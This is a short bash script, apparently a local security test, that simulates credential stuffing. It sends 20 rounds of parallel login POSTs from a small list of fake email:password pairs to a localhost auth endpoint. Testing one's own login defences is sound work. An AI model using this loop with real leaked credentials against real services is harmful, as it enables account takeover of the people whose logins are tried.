#!/bin/bash

echo "🔥 CREDENTIAL STUFFING SIMULATION"

URL="http://localhost:3000/auth/login"

# Simulated leaked combo list
CREDS=(
"user1@test.com:password123"
"user2@test.com:123456"
"user3@test.com:qwerty"
"user4@test.com:letmein"
"user5@test.com:password"
"patient@test.com:wrongpass"
"provider@test.com:wrongpass"
)

for round in {1..20}; do
  for combo in "${CREDS[@]}"; do
    EMAIL=$(echo "$combo" | cut -d: -f1)
    PASS=$(echo "$combo" | cut -d: -f2)

    curl -s -o /dev/null -w "%{http_code}\n" \
      -X POST "$URL" \
      -H "Content-Type: application/json" \
      -d "{
        \"email\": \"$EMAIL\",
        \"password\": \"$PASS\"
      }" &
  done
done

wait
echo "✅ Credential stuffing simulation complete"
